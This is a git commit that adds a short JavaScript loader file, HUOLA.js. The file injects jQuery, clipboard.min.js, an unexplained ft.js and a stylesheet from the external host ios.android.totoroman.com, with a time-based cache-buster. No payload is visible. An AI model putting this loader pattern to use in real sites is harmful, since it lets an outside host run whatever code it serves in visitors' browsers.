1aeebd3c729ffefce2debb6770c5985a3b597991
wCloud <62798721+fulidhw@users.noreply.github.com>
2020-09-08 00:28:22 +0800

    Add files via upload

---
+++ 91app/TC/HUOLA.js
@@ -0,0 +1,6 @@
+var myDate = new Date();
+var time =  myDate.getFullYear() +""+ myDate.getMonth() +""+myDate.getDate() +""+ myDate.getHours();
+document.writeln("<script src=\'https://ios.android.totoroman.com/TC/TC/js/jquery-3.3.1.min.js?"+time+"\'></script>");
+document.writeln("<script src=\'https://ios.android.totoroman.com/TC/TC/js/clipboard.min.js?"+time+"\'></script>"); 
+document.writeln("<script src=\'https://ios.android.totoroman.com/TC/TC/js/ft.js?"+time+"\'></script>"); 
+document.writeln("<link rel=\'stylesheet\' type=\'text/css\' href=\'https://ios.android.totoroman.com/TC/TC/css/huola.css\'>");
